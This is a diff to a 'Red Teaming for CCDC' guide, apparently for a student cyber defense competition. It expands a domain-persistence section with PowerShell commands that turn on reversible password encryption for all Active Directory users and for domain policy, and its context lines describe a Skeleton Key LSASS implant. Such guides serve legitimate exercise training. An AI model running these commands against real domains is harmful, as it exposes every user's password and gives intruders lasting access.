@@ -140,8 +140,9 @@ pagetitle: Red Teaming for CCDC
 
 ## Domain Persistence
 
-**Plaintext Password**
-- Turn on reversible encryption: `Set-ADDefaultDomainPasswordPolicy -Identity {domain} -ReversibleEncryptionEnabled $true`
+**Plaintext Passwords**
+- Allow reversible encryption for all users: `Get-ADUser -Filter { SamAccountName -notlike "*$" } | Set-ADUser -AllowReversiblePasswordEncryption $true`
+- Turn on reversible encryption policy: `Set-ADDefaultDomainPasswordPolicy -Identity {domain} -ReversibleEncryptionEnabled $true`
 
 **Skeleton Key**
 - Implants into LSASS and creates master password working for any AD account
